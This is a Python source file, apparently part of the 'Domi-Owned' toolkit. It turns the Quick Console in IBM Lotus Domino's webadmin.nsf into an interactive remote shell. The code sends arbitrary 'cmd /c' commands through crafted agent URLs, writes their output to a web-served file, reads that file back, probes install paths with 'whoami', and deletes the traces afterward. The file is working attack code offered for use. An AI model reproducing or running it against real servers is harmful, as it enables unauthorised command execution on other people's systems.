# Copyright (c) 2015, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import cmd
import re
import requests
import urllib
from domi_owned import utility

class Interactive(cmd.Cmd, object):
	"""Interact with Domino Quick Console through web requests"""

	def __init__(self, target, header, path, username, password):
		cmd.Cmd.__init__(self)
		self.prompt = 'C:\Windows\System32>'
		self.target = target
		self.header = header
		self.path = path
		self.username = username
		self.password = password

	def emptyline(self):
		pass

	def default(self, line):
		operator = '> '
		self.quick_console(line, operator, self.target, self.header, self.path, self.username, self.password)

	# Handle Domino Quick Console
	def quick_console(self, command, operator, target, header, path, username, password):
		session = requests.Session()
		session.auth = (username, password)

		# Encode command
		raw_command = 'load cmd /c {0} {1}"{2}Domino\\data\\domino\\html\\download\\filesets\\log.txt"'.format(command, operator, path)
		encoded_command = urllib.quote(raw_command, safe='')

		quick_console_url = "{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(target, encoded_command)
		response_url = "{0}/download/filesets/log.txt".format(target)

		# Send commands and handle cleanup
		send_command = session.get(quick_console_url, headers=header, verify=False)
		if send_command.status_code == 200:
			get_response = session.get(response_url, headers=header, verify=False)
			if get_response.status_code == 200 and '>' in operator:
				print get_response.text
			elif get_response.status_code == 200 and '>' not in operator:
				print 'Unable to delete outfile!'
			elif get_response.status_code == 404 and '>' not in operator:
				print 'Outfile sucessfully deleted'
			else:
				print 'Outfile not found!'
				do_exit
		else:
			print 'Quick Console is unavaliable!'
			do_exit

	def do_EOF(self, line):
		operator = ''
		command = 'del'
		self.quick_console(command, operator, self.target, self.header, self.path, self.username, self.password)
		return True

	def help_EOF(self):
		print 'Use exit or quit to cleanly exit.'

	do_exit = do_quit = do_EOF
	help_exit = help_quit = help_EOF

# Check access to webadmin.nsf and get local file path
def check_access(target, header, username, password):
	session = requests.Session()
	session.auth = (username, password)

	try:
		webadmin_url = "{0}/webadmin.nsf".format(target)
		check_webadmin = session.get(webadmin_url, headers=header, verify=False)
		if check_webadmin.status_code == 200:
			if 'form method="post"' in check_webadmin.text:
				utility.print_warn('Unable to access webadmin.nsf, maybe you are not admin?')
			else:
				path_url = "{0}/webadmin.nsf/fmpgHomepage?ReadForm".format(target)
				check_path = session.get(path_url, headers=header, verify=False)
				path_regex = re.search('>(?i)([a-z]:\\\\[a-z0-9()].+\\\\[a-z].+)\\\\domino\\\\data', check_path.text)
				if path_regex:
					path = path_regex.group(1)
				else:
					path = None
					utility.print_status('Could not identify Domino file path, trying defaults...')

				who_am_i, local_path = test_command(target, header, path, username, password)
				if who_am_i and local_path:
					utility.print_good("Running as {0}".format(who_am_i))
					Interactive(target, header, local_path, username, password).cmdloop()
				else:
					utility.print_warn('Unable to access webadmin.nsf!')

		elif check_webadmin.status_code == 401:
			utility.print_warn('Unable to access webadmin.nsf, maybe you are not admin?!')
		else:
			utility.print_warn('Unable to find webadmin.nsf!')

	except Exception as error:
		utility.print_error("Error: {0}".format(error))

# Test outfile redirection
def test_command(target, header, path, username, password):
	session = requests.Session()
	session.auth = (username, password)
	who_am_i, local_path = None, None

	# Default Domino install paths
	paths = ['C:\\Program Files\\IBM\\',            # 9.0.1 Windows x64
		'C:\\Program Files\\IBM\\Lotus\\',          # 8.5.3 Windows x64
		'C:\\Program Files (x86)\\IBM\\',           # 9.0.1 Windows x86
		'C:\\Program Files (x86)\\IBM\\Lotus\\',    # 8.5.3 Windows x86
		'C:\\Lotus\\'                               # Not sure, but just in case
	]

	if path:
		found_path = "{0}\\".format(path)
		paths.insert(0, found_path)

	for local_path in paths:
		try:
			# Encode command
			raw_command = 'load cmd /c whoami > "{0}Domino\\data\\domino\\html\\download\\filesets\\log.txt"'.format(local_path)
			encoded_command = urllib.quote(raw_command, safe='')

			quick_console_url = "{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(target, encoded_command)
			response_url = "{0}/download/filesets/log.txt".format(target)

			# Do things...
			send_command = session.get(quick_console_url, headers=header, verify=False)
			if send_command.status_code == 200:
				get_response = session.get(response_url, headers=header, verify=False)
				if get_response.status_code == 200:
					user_regex = re.search(".+\\\\(.+)", get_response.text)
					if user_regex:
						who_am_i = user_regex.group(1)
						break

		except:
			continue

	return who_am_i, local_path
